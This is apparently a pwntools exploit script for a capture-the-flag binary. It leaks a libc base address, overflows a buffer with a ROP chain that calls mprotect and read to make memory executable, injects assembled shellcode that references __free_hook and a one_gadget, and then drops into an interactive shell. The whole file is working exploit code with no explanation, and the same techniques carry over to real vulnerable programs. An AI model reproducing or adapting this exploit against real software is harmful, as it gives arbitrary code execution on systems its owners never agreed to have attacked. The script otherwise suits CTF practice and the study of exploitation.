import time
from pwn import *

p = process('./bin/chall')
# p = remote('localhost', 7777)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

one_gadget = [0xe3b2e, 0xe3b31, 0xe3b34]

def new(size):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(size).encode())

new(0x90)
new(0x10)
new(0x90)

p.sendlineafter(b'> ', b'3')
p.sendlineafter(b': ', b'0')
p.recvuntil(b'= ')
libc.address = int(p.recvline()[:-1]) - 0x1ecbe0
log.info(hex(libc.address))

pop_rdi = 0x23b72 + libc.address
pop_rsi = 0x2604f + libc.address
pop_rdx_r12 = 0x119241 + libc.address 
writable = libc.bss() + 0x500

chain = [
    pop_rdx_r12, 7, 0, 
    pop_rsi, 0x2000, 
    pop_rdi, writable & 0xfffffffffffff000, 
    libc.symbols['mprotect'],
    pop_rdx_r12, 0x1000, 0,
    pop_rsi, writable,
    pop_rdi, 0,
    libc.symbols['read'],
    writable
]
payload = b'A' * 0x28
for i in chain:
    payload += p64(i)
p.sendlineafter(b'> ', payload)

shellcode = open("shellcode.S", "r").read().format(
    environ = libc.symbols['environ'],
    free_hook = libc.symbols['__free_hook']//8, 
    one_gadget = one_gadget[1]+libc.address
)
open("nasm.S", "w").write(shellcode)
process(['nasm', 'nasm.S', '-f', 'bin', '-O0'])
time.sleep(1)
shellcode = open("./nasm", "rb").read()
p.sendline(shellcode)
p.interactive()
